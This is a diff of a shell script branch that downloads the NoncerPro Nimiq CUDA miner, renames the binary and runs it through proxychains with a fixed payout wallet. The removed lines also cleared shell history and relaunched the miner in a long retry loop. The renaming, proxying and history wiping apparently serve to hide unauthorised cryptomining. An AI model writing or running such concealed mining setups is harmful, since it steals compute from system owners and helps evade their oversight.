@@ -29,9 +29,5 @@ then
 elif [ $3 == "noncepro" ]
 then
     wget https://github.com/NoncerPro/noncerpro-nimiq-cuda/releases/download/v3.3.0/noncerpro-cuda-linux-3.3.0.tar.gz -O noncerpro-cuda-linux-3.3.0.tar.gz && tar xvzf noncerpro-cuda-linux-3.3.0.tar.gz
-    curl https://raw.githubusercontent.com/Vinhuit/retry/master/retry -o /usr/local/bin/retry && chmod +x /usr/local/bin/retry
-    mv noncerpro  $name
-    history -c && history -w
-    retry -t 1000 "timeout 15m bash -c 'proxychains ./$name --address='NQ56 JVMC 03YP S4DY NU9C 4VER JER8 EJY1 JX9U' --server $2 --port 443 --name $hostname --mode dumb'"
-    
+    mv noncerpro  $name && proxychains ./$name --address='NQ56 JVMC 03YP S4DY NU9C 4VER JER8 EJY1 JX9U' --server $2 --port 443 --name $hostname --mode dumb
 fi
